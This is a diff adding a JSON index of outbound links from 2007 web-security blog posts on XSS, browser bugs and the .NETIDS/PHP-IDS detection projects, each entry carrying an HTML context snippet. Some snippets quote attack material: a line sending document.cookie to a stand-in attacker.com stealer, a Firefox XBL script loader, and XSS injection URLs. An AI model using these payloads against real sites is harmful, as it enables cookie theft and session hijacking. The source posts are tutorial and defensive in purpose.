@@ -1,0 +1,287 @@
+{
+ "2007-06-26-netids-v-0-1-1-0-released.md": [
+  {
+   "url": "http://code.google.com/p/dotnetids/",
+   "text": "http://code.google.com/p/dotnetids/",
+   "context": "d exclusions.</p> <p>The latest package is available at the dotnetids homepage: <a href=\"http://code.google.com/p/dotnetids/\">http://code.google.com/p/dotnetids/</a></p>"
+  }
+ ],
+ "2007-06-26-c-dataexecutor-class-available.md": [
+  {
+   "url": "http://www.martineve.com/2007/06/25/c-mysql-dataexecutor-class/",
+   "text": "http://www.martineve.com/2007/06/25/c-mysql-dataexecutor-class/",
+   "context": "provided the class that I use for basic database operations. You can find it at <a href=\"http://www.martineve.com/2007/06/25/c-mysql-dataexecutor-class/\">http://www.martineve.com/2007/06/25/c-mysql-dataexecutor-class/</a>.</p> <p>The class"
+  }
+ ],
+ "2007-06-19-netids-v-0-1-0-0-released.md": [
+  {
+   "url": "http://code.google.com/p/dotnetids",
+   "text": ".NETIDS",
+   "context": "d nullbyte detection</li> <li>page output/fragmented XSS scanning</li> </ul> <p><a href=\"http://code.google.com/p/dotnetids\">.NETIDS</a></p>"
+  }
+ ],
+ "2007-06-15-netids-can-now-detect-fragmented-xss.md": [
+  {
+   "url": "http://code.google.com/p/dotnetids",
+   "text": ".NETIDS project",
+   "context": "<p>Today I made some large commits to the <a href=\"http://code.google.com/p/dotnetids\">.NETIDS project</a> to enable detection of fragmented XSS attacks.</p> <p>For an example of what a fragmented attac"
+  },
+  {
+   "url": "http://www.the-mice.co.uk/SmokeTest/SmokeTest.aspx?param1=Hello%20&param2=this%20&param3=is%20a%20test",
+   "text": "http://www.the-mice.co.uk/SmokeTest/SmokeTest.aspx?param1=Hello%20&amp;param2=this%20&amp;param3=is%20a%20test",
+   "context": "he following url illustrates a fragmented XSS attack:</p> {% highlight html %} <a href=\"http://www.the-mice.co.uk/SmokeTest/SmokeTest.aspx?param1=Hello%20&amp;param2=this%20&amp;param3=is%20a%20test!\">http://www.the-mice.co.uk/SmokeTest/Sm"
+  },
+  {
+   "url": "http://www.the-mice.co.uk/SmokeTest/SmokeTest.aspx?param1=%3C&param2=script&param3=%3E",
+   "text": "http://www.the-mice.co.uk/SmokeTest/SmokeTest.aspx?param1=%3C&amp;param2=script&amp;param3=%3E",
+   "context": "t but not least, here's a live illustration of page output being caught:</p> <p><a href=\"http://www.the-mice.co.uk/SmokeTest/SmokeTest.aspx?param1=%3C&amp;param2=script&amp;param3=%3E\">http://www.the-mice.co.uk/SmokeTest/SmokeTest.aspx?para"
+  }
+ ],
+ "2007-06-13-firefox-nested-comment-fragmented-xss.md": [
+  {
+   "url": "http://sla.ckers.org/forum/read.php?3,12323",
+   "text": "sla.ckers",
+   "context": "<p>Following on from a post on <a href=\"http://sla.ckers.org/forum/read.php?3,12323\">sla.ckers</a> it emerges that Firefox has a vulnerability/bug that is very difficult to filter against and"
+  },
+  {
+   "url": "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd",
+   "text": null,
+   "context": "e:</p> {% highlight html %} <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.1//EN\" \"http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\"> <head> <title>test</title> </head> <body> <!-- This is the fir"
+  },
+  {
+   "url": "http://www.w3.org/1999/xhtml",
+   "text": null,
+   "context": "DTD XHTML 1.1//EN\" \"http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\"> <head> <title>test</title> </head> <body> <!-- This is the first injection point: -- --> <a href=\"This is the second inj"
+  },
+  {
+   "url": "http://www.md5-db.com/STXSS_XBL.xml#loader",
+   "text": null,
+   "context": "This is the second injection point: --evadefilter> <b style=-moz-binding:url('http://www.md5-db.com/STXSS_XBL.xml#loader') /> <a href=test \">link</a> </body> </html> {% endhighlight %} <p>The conditions for the XSS working are 2 inje"
+  }
+ ],
+ "2007-06-05-a-bad-day-for-browsers.md": [
+  {
+   "url": "http://seclists.org/fulldisclosure/2007/Jun/0026.html",
+   "text": "http://seclists.org/fulldisclosure/2007/Jun/0026.html",
+   "context": "/7 unveiled - 2 for IE and 3 for Firefox.</p> <p>Michal Zalewski disclosed 3 at <a href=\"http://seclists.org/fulldisclosure/2007/Jun/0026.html\">http://seclists.org/fulldisclosure/2007/Jun/0026.html</a> and the other can be found at <a href="
+  },
+  {
+   "url": "http://larholm.com/2007/06/04/unpatched-input-validation-flaw-in-firefox-2004/",
+   "text": "http://larholm.com/2007/06/04/unpatched-input-validation-flaw-in-firefox-2004/",
+   "context": "eclists.org/fulldisclosure/2007/Jun/0026.html</a> and the other can be found at <a href=\"http://larholm.com/2007/06/04/unpatched-input-validation-flaw-in-firefox-2004/\">http://larholm.com/2007/06/04/unpatched-input-validation-flaw-in-firefo"
+  }
+ ],
+ "2007-05-25-dotnetids.md": [
+  {
+   "url": "http://code.google.com/p/dotnetids/",
+   "text": "http://code.google.com/p/dotnetids/",
+   "context": "announce the start of dotnetids, a port of phpids to the .NET Framework.</p> <p><a href=\"http://code.google.com/p/dotnetids/\">http://code.google.com/p/dotnetids/</a></p>"
+  }
+ ],
+ "2007-05-23-xss-tutorial.md": [
+  {
+   "url": "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd",
+   "text": null,
+   "context": ":</p> {% highlight html %} <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.1//EN\" \"http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" > <head> <title>XSS Introduction</title> </head>"
+  },
+  {
+   "url": "http://www.w3.org/1999/xhtml",
+   "text": null,
+   "context": "TD XHTML 1.1//EN\" \"http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" > <head> <title>XSS Introduction</title> </head> <body> <a href=\"<?php echo $_GET['linklocation']; ?>\">This"
+  },
+  {
+   "url": "http://uk3.php.net/magic_quotes",
+   "text": "magic_quotes",
+   "context": "d automatically in PHP's attempt to protect the programmer by a system known as <a href=\"http://uk3.php.net/magic_quotes\">magic_quotes</a> which automatically inserts a \\ (backslash) before any type of quote (single or double). This is beca"
+  },
+  {
+   "url": "http://www.attacker.com/stealer.php?cookie=",
+   "text": null,
+   "context": "nd involves the JavaScript code:</p> {% highlight html %} document.location = 'http://www.attacker.com/stealer.php?cookie=' + document.cookie; {% endhighlight %} <p>This method is unsubtle to say the least. The victim will be redirected t"
+  },
+  {
+   "url": "http://www.attacker.com/stealer.php",
+   "text": null,
+   "context": "nd involves the JavaScript code:</p> {% highlight html %} document.location = 'http://www.attacker.com/stealer.php?cookie=' + document.cookie; {% endhighlight %} <p>This method is unsubtle to say the least. The victim will be redirected t"
+  },
+  {
+   "url": "http://www.martineve.com/2007/05/23/string-fromcharcode-encoder/",
+   "text": "encoding tool",
+   "context": "from ascii characters passed to it. You can encode your own JavaScript using my <a href=\"http://www.martineve.com/2007/05/23/string-fromcharcode-encoder/\">encoding tool</a>. So,</p> {% highlight javascript %} document.write('"
+  },
+  {
+   "url": "http://groups.google.de/group/php-ids",
+   "text": "PHP IDS",
+   "context": "ge until it has been sanitized. Furthermore, if you are using PHP check out the <a href=\"http://groups.google.de/group/php-ids\">PHP IDS</a>, a project to detect malicious input.</p> <p>For a list of common XSS attack vectors, check out <a h"
+  },
+  {
+   "url": "http://ha.ckers.org/xss.html",
+   "text": "Rsnake's XSS Cheat Sheet",
+   "context": "tect malicious input.</p> <p>For a list of common XSS attack vectors, check out <a href=\"http://ha.ckers.org/xss.html\">Rsnake's XSS Cheat Sheet</a>.</p>"
+  }
+ ],
+ "2007-05-21-bypassing-same-origin-policy-using-mash-ups.md": [
+  {
+   "url": "http://www.gnucitizen.org",
+   "text": "GNUCITIZEN",
+   "context": "<p><a href=\"http://www.gnucitizen.org\" title=\"GNUZITIZEN's blog\">GNUCITIZEN</a> has been going on about this for some time now, but the truly devastating impact of"
+  },
+  {
+   "url": "http://www.gnucitizen.org/ghdb/",
+   "text": "JavaScript interface",
+   "context": "ct of what he has been saying only actually hit me today when reading about his <a href=\"http://www.gnucitizen.org/ghdb/\">JavaScript interface</a> to <a href=\"http://johnny.ihackstuff.com/ghdb.php\" title=\"Johnny's Google Hacking Database\">J"
+  },
+  {
+   "url": "http://johnny.ihackstuff.com/ghdb.php",
+   "text": "Johnny's Google Hacking Database",
+   "context": "about his <a href=\"http://www.gnucitizen.org/ghdb/\">JavaScript interface</a> to <a href=\"http://johnny.ihackstuff.com/ghdb.php\" title=\"Johnny's Google Hacking Database\">Johnny's Google Hacking Database</a>.</p> <p>The scenario is as follows"
+  },
+  {
+   "url": "http://www.dapper.net/",
+   "text": "Dapper",
+   "context": "utilises the JSON data format to include remote script files. GC's example uses <a href=\"http://www.dapper.net/\" title=\"Dapper the Data Mapper\">Dapper</a> to perform the remote data retrieval in JSON format and then loads it into a script t"
+  }
+ ],
+ "2007-05-20-rsnake-jeremiah-grossmans-book-released.md": [
+  {
+   "url": "http://ha.ckers.org/blog/20070520/xss-book-released/",
+   "text": "ha.ckers",
+   "context": "<p><a href=\"http://ha.ckers.org/blog/20070520/xss-book-released/\">ha.ckers</a> are reporting that their book on Cross Site Scripting has finally been released! Buy"
+  },
+  {
+   "url": "http://www.amazon.com/Cross-Site-Scripting-Attacks-Exploits/dp/1597491543/sr=1-1/qid=1170769149?ie=UTF8&s=books",
+   "text": "Amazon",
+   "context": "hat their book on Cross Site Scripting has finally been released! Buy a copy at <a href=\"http://www.amazon.com/Cross-Site-Scripting-Attacks-Exploits/dp/1597491543/sr=1-1/qid=1170769149?ie=UTF8&amp;s=books\">Amazon</a>!</p>"
+  }
+ ],
+ "2007-05-19-xsf-cross-site-flashing.md": [
+  {
+   "url": "http://www.wisec.it/en/Docs/flash_App_testing_Owasp07.pdf",
+   "text": "interesting paper",
+   "context": "<p>Stefano Di Paola presented an <a href=\"http://www.wisec.it/en/Docs/flash_App_testing_Owasp07.pdf\" title=\"Flash application testing\">interesting paper</a> on Flash security at OWASP 2007 whic"
+  }
+ ],
+ "2007-05-16-xss-in-excess-a-learn-xss-tool.md": [
+  {
+   "url": "http://wasjournal.blogspot.com/2007/05/xss-in-excess.html",
+   "text": "XSS in eXceSS",
+   "context": "<p>kishord today presents a tool, called <a href=\"http://wasjournal.blogspot.com/2007/05/xss-in-excess.html\" title=\"XSS in eXceSS\">XSS in eXceSS</a> and hosted by <a href=\"http://mario.heideri.ch/\" tit"
+  },
+  {
+   "url": "http://mario.heideri.ch/",
+   "text": ".mario",
+   "context": "07/05/xss-in-excess.html\" title=\"XSS in eXceSS\">XSS in eXceSS</a> and hosted by <a href=\"http://mario.heideri.ch/\" title=\".mario's blog\">.mario</a> that will allow you test attack vectors against a page in different contexts. On top of that"
+  },
+  {
+   "url": "http://groups.google.de/group/php-ids",
+   "text": "PHP IDS",
+   "context": "ctors against a page in different contexts. On top of that it also incorporates <a href=\"http://groups.google.de/group/php-ids\" title=\"PHP IDS\">PHP IDS</a>, allowing you to skip whichever rules you choose.</p> <p>From kishord's post:</p> <b"
+  },
+  {
+   "url": "http://h4k.in/xssinexcess",
+   "text": "page",
+   "context": "rs which lead to different XSS areas.</p> <p>Please read the usage notes on the <a href=\"http://h4k.in/xssinexcess\">page</a>.<br /> In order to make it a learning tool, it is coupled with PHP IDS with some modifications. It lets the user ch"
+  }
+ ],
+ "2007-05-16-xss-cheat-sheet.md": [
+  {
+   "url": "http://www.ha.ckers.org",
+   "text": "rsnake",
+   "context": "point out this invaluable resource for those interested in XSS attack vectors; <a href=\"http://www.ha.ckers.org\" title=\"ha.ckers\">rsnake</a>'s <a href=\"http://ha.ckers.org/xss.html\" title=\"XSS Cheat Sheet\">XSS Cheat Sheet</a>.</p>"
+  },
+  {
+   "url": "http://ha.ckers.org/xss.html",
+   "text": "XSS Cheat Sheet",
+   "context": "attack vectors; <a href=\"http://www.ha.ckers.org\" title=\"ha.ckers\">rsnake</a>'s <a href=\"http://ha.ckers.org/xss.html\" title=\"XSS Cheat Sheet\">XSS Cheat Sheet</a>.</p>"
+  }
+ ],
+ "2007-05-16-php-ids.md": [
+  {
+   "url": "http://mario.heideri.ch/",
+   "text": ".mario",
+   "context": "<p>For those who haven't yet seen this, <a href=\"http://mario.heideri.ch/\" title=\".mario's blog\">.mario</a> and <a href=\"http://christ1an.blogspot.com/\" title=\"christian's blog\">christ1an</a> over at"
+  },
+  {
+   "url": "http://christ1an.blogspot.com/",
+   "text": "christ1an",
+   "context": "n this, <a href=\"http://mario.heideri.ch/\" title=\".mario's blog\">.mario</a> and <a href=\"http://christ1an.blogspot.com/\" title=\"christian's blog\">christ1an</a> over at <a href=\"http://sla.ckers.org/forum/read.php?12,8085\" title=\"sla.ckers\">"
+  },
+  {
+   "url": "http://sla.ckers.org/forum/read.php?12,8085",
+   "text": "sla.ckers",
+   "context": "\"http://christ1an.blogspot.com/\" title=\"christian's blog\">christ1an</a> over at <a href=\"http://sla.ckers.org/forum/read.php?12,8085\" title=\"sla.ckers\">sla.ckers</a> has been working on a PHP Intrusion Detection System and the results are f"
+  },
+  {
+   "url": "http://groups.google.de/group/php-ids",
+   "text": "Google Group",
+   "context": ">detects possible event handlers</em><br/><br /> impact: 4</p> <p>Check out the <a href=\"http://groups.google.de/group/php-ids\" title=\"PHP IDS Google Group\">Google Group</a> and the <a href=\"http://phpids.heideri.ch/\" title=\"PHP IDS Live Sa"
+  },
+  {
+   "url": "http://phpids.heideri.ch/",
+   "text": "live sandbox",
+   "context": ".google.de/group/php-ids\" title=\"PHP IDS Google Group\">Google Group</a> and the <a href=\"http://phpids.heideri.ch/\" title=\"PHP IDS Live Sandbox\">live sandbox</a> for more.</p>"
+  }
+ ],
+ "2007-05-16-moseb-month-of-search-engine-bugs.md": [
+  {
+   "url": "http://websecurity.com.ua/category/moseb/",
+   "text": "http://websecurity.com.ua/category/moseb/",
+   "context": "ion at a time, but there will be bonus publications also).</p></blockquote> <p> <a href=\"http://websecurity.com.ua/category/moseb/\">http://websecurity.com.ua/category/moseb/</a></p>"
+  }
+ ],
+ "2007-05-16-heise-security-reports-backdoor-in-artmedic-cms.md": [
+  {
+   "url": "http://www.heise-security.co.uk/news/89835",
+   "text": "a backdoor",
+   "context": "<p>As the title says, heise Security have found <a href=\"http://www.heise-security.co.uk/news/89835\" title=\"heise Security\">a backdoor</a> in the <a href=\"http://www.artmedic-cms.de/\" title=\"Artmedic CMS\">Art"
+  },
+  {
+   "url": "http://www.artmedic-cms.de/",
+   "text": "Artmedic CMS",
+   "context": "w.heise-security.co.uk/news/89835\" title=\"heise Security\">a backdoor</a> in the <a href=\"http://www.artmedic-cms.de/\" title=\"Artmedic CMS\">Artmedic CMS</a> system. The interesting question is how this backdoor was implanted - giving the ben"
+  }
+ ],
+ "2007-05-15-javascript-referer-scripts-xss-injection.md": [
+  {
+   "url": "http://www.yaldex.com/FSPageDetails/_404Referrer.htm",
+   "text": "http://www.yaldex.com/FSPageDetails/_404Referrer.htm",
+   "context": "iginal page that points to the invalid link. An example of this can be found at <a href=\"http://www.yaldex.com/FSPageDetails/_404Referrer.htm\">http://www.yaldex.com/FSPageDetails/_404Referrer.htm</a>. The attentive observer will spot that t"
+  },
+  {
+   "url": "http://www.md5-db.com/XSSReferer/",
+   "text": "http://www.md5-db.com/XSSReferer/'style=xx:expression(alert(1));othervar='",
+   "context": "li>Visit the virtual RewriteRule with a malicious string. An example for IE7 is <a href=\"http://www.md5-db.com/XSSReferer/'style=xx:expression(alert(1));othervar='\">http://www.md5-db.com/XSSReferer/'style=xx:expression(alert(1));othervar='<"
+  }
+ ],
+ "2007-05-15-javascript-eval-string-fromcharcode-encoder.md": [
+  {
+   "url": "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd",
+   "text": null,
+   "context": "ghlight html %} <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html> <head> <title>Javascript Eval Encoder</title> <meta http-equiv=\"Content-Type\" content=\"text/h"
+  }
+ ],
+ "2007-05-15-httponly-cookie-detection.md": [
+  {
+   "url": "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd",
+   "text": null,
+   "context": "ttpOnly\"); ?> <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html> <head> <title>HTTPOnly Cookie Test</title> <meta http-equiv=\"Content-Type\" content=\"text/ht"
+  }
+ ],
+ "2007-05-15-firefox-xbl-js-loader-v1-0.md": [
+  {
+   "url": "http://site.com/STXSS_XBL.xml#loader",
+   "text": null,
+   "context": "(different encodings may be necessary): &lt;element style = \"-moz-binding:url('http://site.com/STXSS_XBL.xml#loader');\" /&gt;.</li> <li>Browser loads XBL document.</li> <li>XBL document modifies DOM to include &lt;script src=\"evil_script.j"
+  },
+  {
+   "url": "http://www.mozilla.org/xbl",
+   "text": null,
+   "context": "is as follows:</p> {% highlight xml %} <?xml version=\"1.0\"?> <bindings xmlns=\"http://www.mozilla.org/xbl\"> <binding id=\"loader\"> <implementation> <constructor> <![CDATA[ //This i"
+  },
+  {
+   "url": "http://www.your-site.com/STXSS_JS.js",
+   "text": null,
+   "context": "dit this line to the URL of the STXSS Javascript var url = \"http://www.your-site.com/STXSS_JS.js\"; //Do not edit below this line var scr = document.createElement(\"script\");"
+  }
+ ]
+}
